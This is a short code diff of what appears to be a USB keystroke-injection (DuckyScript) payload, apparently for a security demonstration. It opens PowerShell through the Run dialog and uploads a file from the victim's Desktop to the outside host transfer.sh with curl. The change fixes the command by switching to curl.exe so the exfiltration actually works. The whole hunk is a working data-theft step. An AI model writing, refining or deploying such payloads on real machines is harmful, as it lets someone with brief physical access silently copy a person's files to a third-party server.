@@ -40,7 +40,9 @@ DELAY 5000
 REM 👉 Send file content to the internet
 GUI r
 DELAY 1000
-STRING powershell -NoExit -Command "curl -X PUT --upload-file \"$env:USERPROFILE\Desktop\SecurityDemo.txt\" https://transfer.sh/SecurityDemo.txt"
+REM STRING powershell -NoExit -Command "curl -X PUT --upload-file \"$env:USERPROFILE\Desktop\SecurityDemo.txt\" https://transfer.sh/SecurityDemo.txt"
+REM curl.exe to avoid alias for Invoke-WebRequest
+STRING powershell -NoExit -Command "curl.exe -X PUT --upload-file \"$env:USERPROFILE\Desktop\SecurityDemo.txt\" https://transfer.sh/SecurityDemo.txt"
 ENTER
 DELAY 5000
 
